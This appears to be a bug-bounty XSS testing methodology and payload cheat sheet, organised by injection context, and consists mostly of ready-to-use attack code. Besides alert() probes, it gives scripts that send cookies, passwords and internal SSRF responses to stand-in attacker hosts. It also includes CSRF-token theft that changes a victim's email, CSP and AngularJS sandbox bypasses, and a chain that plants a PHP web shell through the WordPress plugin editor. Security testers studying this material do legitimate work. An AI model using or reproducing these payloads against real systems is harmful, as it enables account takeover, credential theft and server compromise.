# Cross-Site Scripting (XSS) – Testing Questions & Methodology

---

# Target Features

- User-supplied input -> URL parameters, POST bodies, headers, JSON responses
- Stored content -> comments, profiles, tickets, admin notes
- DOM sources -> location, hash, window.name, storage
- Client-side rendering logic
- Third-party libraries -> jQuery, AngularJS
- Dynamic HTML / JavaScript execution paths

---

# Advanced Setups / Startup Configurations

## Bugmith-XSS-01 --- Burp Browser DOM Invader

Automate detection of DOM XSS sources and sinks.  
Configure DOM Invader inside Burp's embedded browser.

---

## Bugmith-XSS-02 --- Burp Suite Match & Replace (User-Agent injection)

Inject XSS payloads automatically into User-Agent header.

Test on:
https://httpbin.org/get

---

## Bugmith-XSS-03 --- Bugmith-XSS Automated Manual Tester

Tool:
https://github.com/bugmithlegend/Bugmith-XSS-Tester/tree/main

Use for:
- Parameter fuzzing
- Reflection discovery
- Direct exploitation

---

# Input Reflection & Execution

## Bugmith-XSS-04 --- Unfiltered Reflected Input

Question: Can input execute immediately when reflected?

```html
<script>alert(document.domain)</script>
```

---

## Bugmith-XSS-05 --- Reflected Input Context Breakout

Question: Can I break out of HTML/JS attribute contexts?

```html
"><img src=x onerror=alert(document.domain)>
```

---

# Stored Input Execution

## Bugmith-XSS-06 --- Unfiltered Stored Input

```html
<script>alert(document.domain)</script>
```

---

## Bugmith-XSS-07 --- Stored Input Across Privilege Boundaries

Low privilege -> Stored input  
High privilege -> Executes payload

```html
<script>alert(document.domain)</script>
```

---

# DOM-Based XSS

## Bugmith-XSS-08 --- Attacker-Controlled Sources

Sources:
- location.search
- location.hash
- window.name
- cookies
- localStorage
- sessionStorage
- IndexedDB

Sinks:
- innerHTML
- outerHTML
- insertAdjacentHTML
- document.write()
- eval()
- Function()

Payload:

```html
"><img src=x onerror=alert(document.domain)>
```

---

## Bugmith-XSS-09 --- DOM XSS in Select Elements

```html
"></select><img src=x onerror=alert(document.domain)>
```

---

## Bugmith-XSS-10 --- Third-Party Attribute Sinks

```html
javascript:alert(document.cookie)
```

---

## Bugmith-XSS-11 --- Selector Manipulation (jQuery / Other Libraries)

```html
<iframe src="https://target.com/#" onload="this.src+='<img src=x onerror=alert(1)>'"></iframe>
```

---

## Bugmith-XSS-12 --- AngularJS Expression Injection

```html
{{$on.constructor('alert(1)')()}}
```

---

# JSON & Script Contexts

## Bugmith-XSS-13 --- Reflected JSON

```javascript
"-alert(1)}//
```

---

## Bugmith-XSS-14 --- Stored DOM XSS with Filter Bypass

```html
<><img src=1 onerror=alert(1)>
```

---

# XSS Context Identification & Exploitation

## Bugmith-XSS-15 --- Context Identification

Identify if reflection is inside:

- HTML between tags
- Attribute value
- JavaScript block
- JSON
- Template literal

---

## Bugmith-XSS-16 --- HTML Between Tags

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
"><body onresize=print()>
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
"><svg><animate attributeName=href values=javascript:alert(1)/><text>Click me</text></svg>
```

---

## Bugmith-XSS-17 --- Attribute Injection / Breakout

```html
"><script>alert(document.domain)</script>
```

---

## Bugmith-XSS-18 --- Event Handler Injection

```html
" autofocus onfocus=alert(document.domain) x="
```

---

## Bugmith-XSS-19 --- JavaScript Protocol Injection

```html
javascript:alert(document.domain)
```

---

## Bugmith-XSS-20 --- JS Context (Script Breakout)

```html
</script><img src=1 onerror=alert(1)>
```

---

## Bugmith-XSS-21 --- JS String Escape

```javascript
'-alert(document.domain)-'
';alert(document.domain)//
```

---

## Bugmith-XSS-22 --- Backslash Escape Bypass

```javascript
\';alert(document.domain)//
```

---

## Bugmith-XSS-23 --- JS Execution Without Parentheses

```javascript
onerror=alert;throw 1
```

---

## Bugmith-XSS-24 --- HTML-Encoded JS Attributes

```html
&apos;-alert(document.domain)-&apos;
```

---

# Template Literals & AngularJS

## Bugmith-XSS-25 --- JS Template Literals

```javascript
${alert(document.domain)}
```

---

## Bugmith-XSS-26 --- AngularJS Template Injection

```html
{{alert(document.domain)}}
{{$on.constructor('alert(1)')()}}
```

---

## Bugmith-XSS-27 --- AngularJS Sandbox Detection

```html
{{constructor}}
```

---

## Bugmith-XSS-28 --- AngularJS Prototype Escape

```html
{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}
```

---

## Bugmith-XSS-29 --- AngularJS Sandbox Escape Without Quotes

```html
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

---

## Bugmith-XSS-30 --- AngularJS CSP Bypass ($event)

```html
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```

---

## Bugmith-XSS-31 --- AngularJS CSP Bypass Without Window

```html
{{[1].map(alert)}}
```

---

# Dangling Markup Injection

```html
">
"><img src='//attacker.com?
"><iframe src='//attacker.com?
foo@bar"><button formaction="https://exploit-server.net/exploit" formmethod="get">Click me</button>
```

Use cases:
- Data capture
- Form hijacking
- Multiline content exfiltration
- CSP bypasses

---

# CSP Bypasses

## Bugmith-XSS-38 --- CSP Identification

Inspect:
- Content-Security-Policy header
- unsafe-inline
- unsafe-eval
- report-only mode

---

## Bugmith-XSS-39 --- CSP Policy Injection

```html
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

---

## Bugmith-XSS-40 --- Missing form-action Directive

```html
foo@bar"><button formaction="https://exploit-server.net/exploit" formmethod="get">Click me</button>
```

---

## Bugmith-XSS-42 --- CSP Bypass Using Allowed External Sources

If `script-src` allows controllable domain -> host malicious JS there -> load script.

---

# XSS Exploitation & Impact Escalation

## Bugmith-XSS-44 --- Steal Cookies

```html
<script>
fetch('https://attacker-server.net/exfil',{
method:'POST',
mode:'no-cors',
body:document.cookie
});
</script>
```

---

## Bugmith-XSS-45 --- Capture Passwords

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://attacker-server.net/exfil',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
```

---

## Bugmith-XSS-46 --- CSRF Token Theft

```html
<script>
var req=new XMLHttpRequest();
req.onload=function(){
var token=this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq=new XMLHttpRequest();
changeReq.open('post','/my-account/change-email',true);
changeReq.send('csrf='+token+'&email=attacker@evil.com');
};
req.open('get','/my-account',true);
req.send();
</script>
```

---

## Bugmith-XSS-47 --- XSS -> SSRF

```html
<script>
var internalTargets=['http://192.168.0.1','http://internal-api.local/health'];
internalTargets.forEach(target=>{
fetch(target,{mode:'no-cors',credentials:'include'})
.then(res=>res.text())
.then(data=>{
fetch('https://attacker-server.net/exfil',{
method:'POST',
mode:'no-cors',
body:target+'::'+data.substring(0,500)
});
});
});
</script>
```

---

## Bugmith-XSS-48 --- XSS -> Admin Session Theft -> Privilege Escalation

Steal admin cookie -> Replay session -> Access admin panel.

---

## Bugmith-XSS-49 --- XSS to Remote Code Execution (RCE) via Admin Functionality

Scenario: Admin panel has a "Theme Editor" or "Plugin Editor" that allows editing .php files.

Step 1 -> Steal admin session cookie via XSS  
Step 2 -> Use the admin session to fetch the CSRF token for the editor page  
Step 3 -> Submit a POST request to modify a vulnerable PHP file with a web shell  

Exploit Payload:

```html
<script>
fetch('/wp-admin/plugin-editor.php?file=akismet/akismet.php',{credentials:'include'})
.then(res=>res.text())
.then(html=>{
var tokenMatch=html.match(/name='_wpnonce' value='([^']+)'/);
if(tokenMatch){
var wpnonce=tokenMatch[1];
var maliciousCode="<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>";
var formData=new FormData();
formData.append('_wpnonce',wpnonce);
formData.append('newcontent',maliciousCode);
formData.append('action','update');
formData.append('file','akismet/akismet.php');
formData.append('scrollto','0');
fetch('/wp-admin/plugin-editor.php',{method:'POST',credentials:'include',body:formData});
}});
</script>
```

---

# Ready XSS Payloads

## -- OBFUSCATED XSS PAYLOADS --

```javascript
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

```javascript
b=document.cookie;c="a";g="lert";y=c+g;x=window[y];window[Symbol.toPrimitive]=x(b);window+'';
```

---

## -- REFLECTED XSS (HTML CONTEXT) --

```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
"><iframe src="javascript:alert(1)"></iframe>
```

---

## -- HTML ATTRIBUTE CONTEXT --

```html
" onmouseover="alert(1)
' onfocus='alert(1)
" autofocus onfocus=alert(1) x="
javascript:alert(1)
```

---

## -- JAVASCRIPT CONTEXT --

```javascript
</script><script>alert(1)</script>
';alert(1);//
"-alert(1)-"
\';alert(1);//
onerror=alert;throw 1
&apos;-alert(1)-&apos;
```

---

## -- DOM-BASED XSS PAYLOADS --

```html
"><img src=x onerror=alert(document.domain)>
"></select><img src=x onerror=alert(document.domain)>
{{$on.constructor('alert(1)')()}}
${alert(document.domain)}
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```

---

## -- ANGULARJS / TEMPLATE INJECTION --

```html
{{alert(document.domain)}}
{{$on.constructor('alert(1)')()}}
{{constructor}}
{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}
{{[1].map(alert)}}
```

---

## -- JSON / SCRIPT CONTEXT --

```javascript
"-alert(1)}//
<><img src=1 onerror=alert(1)>
```

---

## -- SVG PAYLOADS --

```html
"><svg><animatetransform onbegin=alert(1)>
<svg><a><animate attributeName=href values=javascript:alert(1)/><text x=20 y=20>Click me</text></a>
```

---

## -- PASSWORD / COOKIE THEFT --

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://attacker-server.net/exfil',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
<script>fetch('https://attacker-server.net/exfil',{method:'POST',mode:'no-cors',body:document.cookie});</script>
```

---

## -- FORM HIJACK / CSRF EXPLOITS --

```html
foo@bar"><button formaction="https://exploit-server.net/exploit" formmethod="get">Click me</button>
```

```html
<script>
var req=new XMLHttpRequest();
req.onload=handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse(){
var token=this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq=new XMLHttpRequest();
changeReq.open('post','/my-account/change-email',true);
changeReq.send('csrf='+token+'&email=attacker@evil.com');
};
</script>
```

---

## -- SSRF --

```html
<script>
var internalTargets = ['http://34.57.81.147/backend', 'http://evil.com/admin', 'http://internal-api.local/health'];
internalTargets.forEach(target => {
fetch(target, {mode: 'no-cors', credentials: 'include'})
.then(res => res.text())
.then(data => {
fetch('https://attacker-server.net/exfil', {
method: 'POST',
mode: 'no-cors',
body: target + '::' + data.substring(0, 500)
});
})
.catch(err => console.log(err));
});
</script>
```

Steal internal service data via image theft:

```html
<img src="http://internal-dashboard.local/chart.png"
onerror="this.src='http://internal-dashboard.local/logo.jpg'"
onload="fetch('https://attacker-server.net/exfil?img='+encodeURIComponent(this.src))">
```

---

## -- RCE / ADMIN PAYLOADS --

```html
<script>
fetch('/wp-admin/plugin-editor.php?file=akismet/akismet.php',{credentials:'include'})
.then(res=>res.text())
.then(html=>{
var tokenMatch=html.match(/name='_wpnonce' value='([^']+)'/);
if(tokenMatch){
var wpnonce=tokenMatch[1];
var maliciousCode="<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>";
var formData=new FormData();
formData.append('_wpnonce',wpnonce);
formData.append('newcontent',maliciousCode);
formData.append('action','update');
formData.append('file','akismet/akismet.php');
formData.append('scrollto','0');
fetch('/wp-admin/plugin-editor.php',{method:'POST',credentials:'include',body:formData});
}});
</script>
```

---

## Impact Escalation Chains

- XSS -> Session Hijacking  
- XSS -> Account Takeover  
- XSS -> CSRF Bypass  
- XSS -> SSRF  
- XSS -> Admin Session Theft  
- XSS -> Remote Code Execution
